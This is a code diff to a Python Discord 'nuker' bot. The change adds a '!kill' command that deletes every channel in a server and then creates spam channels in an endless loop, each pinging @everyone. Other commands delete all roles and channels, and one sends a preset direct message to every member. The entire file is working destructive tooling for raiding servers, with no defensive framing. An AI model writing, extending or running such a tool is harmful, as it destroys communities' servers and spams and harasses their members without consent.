@@ -13,7 +13,8 @@ print(f"""{r}
 
 TOKEN = input("Input Bot Token: ")
 SPAM_MESSAGE = input("Input your Spam Message: ")
-DM_ALL = input("Dm Message for all Members: ")
+CHANNEL_SPAM = input("Input your spam create Channel Name: ")
+DM_ALL = input("Input Dm Message for all Members: ")
 
 bot = commands.Bot(command_prefix="!" ,help_command=None, intents=discord.Intents.all())
 bot.remove_command('help')
@@ -25,16 +26,10 @@ Bot is Online!
 
 Commands:
 1. !delroles (deletes all roles)
-2. !spamchannel (input message after command)
+2. kill server (nukes server)
 3. !dmall (dm all server members)
 4. !delchannels (deletes all channels)
 """)
-
-@bot.command()
-async def delchannels(ctx):
-    await ctx.message.delete()
-    for channel in list(ctx.guild.channels):
-     await channel.delete()    
 
 @bot.command()
 async def delroles(ctx):
@@ -45,19 +40,30 @@ async def delroles(ctx):
         print(Fore.MAGENTA + f"Cannot delete {role.name}")
 
 @bot.command()
-async def dmall(ctx, *, message):
-        for user in ctx.guild.members:
-            try:
-                await user.send(message)
-            except:
-                 print(Fore.MAGENTA + f"Cannot DM{user.name}")
-
-@bot.command()
-async def spamchannel(ctx, arg: str):
+async def kill(ctx, arg: str):
+    await ctx.message.delete()
+    for channel in list(ctx.guild.channels):
+     await channel.delete()  
     allowed_mentions = discord.AllowedMentions(everyone = True)
     guild = ctx.message.guild
     while True:
         channel = await guild.create_text_channel(arg)
         await channel.send(content = SPAM_MESSAGE, allowed_mentions = allowed_mentions)
+
+@bot.command()
+async def dmall(ctx):
+        for user in ctx.guild.members:
+            try:
+                await user.send(DM_ALL)
+            except:
+                 print(Fore.MAGENTA + f"Cannot DM{user.name}")
+
+@bot.command()
+async def delchannels(ctx):
+    await ctx.message.delete()
+    for channel in list(ctx.guild.channels):
+     await channel.delete()  
+    guild = ctx.message.guild
+    await guild.create_text_channel("nuked")
 
 bot.run(TOKEN) 
